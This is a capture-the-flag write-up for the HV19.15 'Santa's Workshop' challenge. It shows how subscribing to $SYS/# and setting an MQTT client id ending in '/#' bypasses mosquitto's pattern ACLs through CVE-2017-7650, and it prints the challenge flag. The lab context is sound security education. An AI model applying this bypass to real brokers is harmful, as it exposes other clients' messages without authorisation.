# HV19.15 Santa's Workshop

https://academy.hacking-lab.com/events/6/challenges/82

Today it's all about a websocket based IoT protocol: MQTT

Reading on [wikipedia](https://de.wikipedia.org/wiki/MQTT) how it works, and playing in the browser by modifying global variables (`topic`, `username`, `password`) and reconnecting (using `mqtt.disconnect()` and relying on automatic reconnect).

To log the messages I modified the related function `onMessageArrived`:

```javascript
function onMessageArrived(message) {
    var topic = message.destinationName;
    var payload = message.payloadString;
    console.log(topic)
    console.log(payload)
    countUp.update(payload);
};

mqtt.disconnect()
```

After a chat with TheCompiler I was strengthened that I have to find some MQTT related issues. So I was reading more (about the basics)[https://www.hivemq.com/blog/mqtt-essentials-part-5-mqtt-topics-best-practices/] and played around with the topic wildcard operators:

```javascript
topic = 'HV19/gifts/'+clientId;
topic = 'HV19/gifts/#';
topic = 'HV19/+/'+clientId;
topic = '$SYS/#';
```

Subscribing to `$SYS/#` leaked the following information: 

    $SYS/broker/version
    mosquitto version 1.4.11 (We elves are super-smart and know about CVE-2017-7650 and the POC. So we made a genious fix you never will be able to pass. Hohoho)

The summary of the **CVE-2017-7650** vulnerability is

    In Mosquitto before 1.4.12, pattern based ACLs can be bypassed by clients that set their username/client id to '#' or '+'. This allows locally or remotely connected clients to access MQTT topics that they do have the rights to. The same issue may be present in third party authentication/access control plugins for Mosquitto.

So from this hint, I expect that we can do something with # or + in the clientid.

The solution after fiddling with everything is:

```javascript
clientid = "0273878540509521/#"
topic = "HV19/#"
```

This brings up the flag in the javascript console log:

    HV19/gifts/0273878540509521/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}
    Congrats, you got it. The elves should not overrate their smartness!!!

